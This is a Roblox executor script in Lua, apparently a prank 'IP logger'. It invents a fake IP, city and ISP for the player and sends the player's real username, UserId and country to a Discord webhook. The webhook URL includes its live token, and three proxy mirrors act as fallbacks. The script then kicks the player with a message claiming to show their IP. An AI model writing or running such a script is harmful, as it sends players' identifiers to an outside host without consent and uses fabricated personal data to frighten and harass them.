local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1549674554773733446/Jogc_vxOXN-SYDWV172EwDQhdqez57sBvhE4Lar9D1lYd1Iqq8VZauUl-6vzfKOI6Pys"

local PROXIES_FALLBACK = {
    "https://webhook.lewisakura.moe/api/webhooks/1549674554773733446/Jogc_vxOXN-SYDWV172EwDQhdqez57sBvhE4Lar9D1lYd1Iqq8VZauUl-6vzfKOI6Pys",
    "https://hooks.hyra.io/api/webhooks/1549674554773733446/Jogc_vxOXN-SYDWV172EwDQhdqez57sBvhE4Lar9D1lYd1Iqq8VZauUl-6vzfKOI6Pys",
    "https://webhook.newstargeted.com/api/webhooks/1549674554773733446/Jogc_vxOXN-SYDWV172EwDQhdqez57sBvhE4Lar9D1lYd1Iqq8VZauUl-6vzfKOI6Pys",
}

local base = {
    BR = {
        nome = "Brasil",
        regioes = {
            ["São Paulo"]         = {"São Paulo", "Campinas", "Santos", "Ribeirão Preto"},
            ["Rio de Janeiro"]    = {"Rio de Janeiro", "Niterói", "Petrópolis", "Campos"},
            ["Minas Gerais"]      = {"Belo Horizonte", "Uberlândia", "Contagem", "Juiz de Fora"},
            ["Paraná"]            = {"Curitiba", "Londrina", "Maringá", "Ponta Grossa"},
            ["Rio Grande do Sul"] = {"Porto Alegre", "Caxias do Sul", "Pelotas", "Canoas"},
            ["Bahia"]             = {"Salvador", "Feira de Santana", "Vitória da Conquista"},
            ["Pernambuco"]        = {"Recife", "Jaboatão", "Olinda", "Caruaru"},
            ["Ceará"]             = {"Fortaleza", "Caucaia", "Juazeiro do Norte"},
            ["Distrito Federal"]  = {"Brasília", "Taguatinga", "Ceilândia"},
            ["Amazonas"]          = {"Manaus", "Parintins", "Itacoatiara"},
        },
        operadoras = {"Vivo Fibra", "Claro NET", "TIM Live", "Oi Fibra", "Algar Telecom", "Sky Brasil"},
        faixaIP = {177, 179, 187, 189, 191, 200, 201},
    },
    US = {
        nome = "Estados Unidos",
        regioes = {
            ["California"] = {"Los Angeles", "San Francisco", "San Diego", "Sacramento"},
            ["Texas"]      = {"Houston", "Dallas", "Austin", "San Antonio"},
            ["New York"]   = {"New York City", "Buffalo", "Rochester", "Albany"},
            ["Florida"]    = {"Miami", "Orlando", "Tampa", "Jacksonville"},
        },
        operadoras = {"Comcast Xfinity", "AT&T Internet", "Verizon Fios", "Spectrum"},
        faixaIP = {24, 47, 66, 71, 73, 98, 108},
    },
    PT = {
        nome = "Portugal",
        regioes = {
            ["Lisboa"] = {"Lisboa", "Sintra", "Cascais", "Loures"},
            ["Porto"]  = {"Porto", "Vila Nova de Gaia", "Matosinhos"},
            ["Braga"]  = {"Braga", "Guimarães", "Barcelos"},
        },
        operadoras = {"MEO", "NOS", "Vodafone Portugal", "Nowo"},
        faixaIP = {85, 88, 89, 94, 188},
    },
}

local fallback = {
    nome = "Desconhecido",
    regioes = {["Região Central"] = {"Cidade Principal"}},
    operadoras = {"ISP Local"},
    faixaIP = {100, 150, 180},
}

local function escolherChave(t)
    local k = {}
    for key in pairs(t) do table.insert(k, key) end
    return k[math.random(#k)]
end

local function gerarIP(faixa)
    return faixa[math.random(#faixa)] .. "." ..
           math.random(0,255) .. "." ..
           math.random(0,255) .. "." ..
           math.random(1,254)
end

local function obterPais()
    local ok, code = pcall(function()
        return LocalizationService:GetCountryRegionForPlayerAsync(LocalPlayer)
    end)
    if ok and code and base[code] then return code end
    return nil
end

local httpRequest = request or http_request or syn_request
if not httpRequest then
    warn("Executor sem suporte a request.")
    return
end

math.randomseed(LocalPlayer.UserId)

local paisCode = obterPais()
local dados = paisCode and base[paisCode] or fallback

local estado = escolherChave(dados.regioes)
local cidades = dados.regioes[estado]
local cidade = cidades[math.random(#cidades)]
local operadora = dados.operadoras[math.random(#dados.operadoras)]
local ip = gerarIP(dados.faixaIP)

task.wait(math.random(5, 15) / 10)

local function montarPayload()
    return {
        username = "IP Logger",
        embeds = {{
            title = "🌐 Nova consulta de IP",
            color = 0x00B4FF,
            fields = {
                { name = "👤 Jogador",   value = LocalPlayer.Name,              inline = true },
                { name = "🆔 UserId",    value = tostring(LocalPlayer.UserId),  inline = true },
                { name = "📡 IP",        value = "```" .. ip .. "```",          inline = false },
                { name = "🌎 País",      value = dados.nome,                    inline = true },
                { name = "📍 Estado",    value = estado,                        inline = true },
                { name = "🏙️ Cidade",    value = cidade,                        inline = true },
                { name = "📶 Operadora", value = operadora,                     inline = true },
                { name = "🕒 Horário",   value = os.date("%d/%m/%Y %H:%M:%S"),  inline = true },
            },
            footer = { text = "IP Logger" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        }}
    }
end

local function enviar()
    local body = HttpService:JSONEncode(montarPayload())
    local urls = { WEBHOOK_URL }
    for _, u in ipairs(PROXIES_FALLBACK) do
        if u ~= WEBHOOK_URL then table.insert(urls, u) end
    end
    for _, url in ipairs(urls) do
        local ok = pcall(function()
            httpRequest({
                Url = url,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = body,
            })
        end)
        if ok then return true end
    end
    return false
end

enviar()

task.wait(1)

LocalPlayer:Kick("Seu IP: " .. ip)
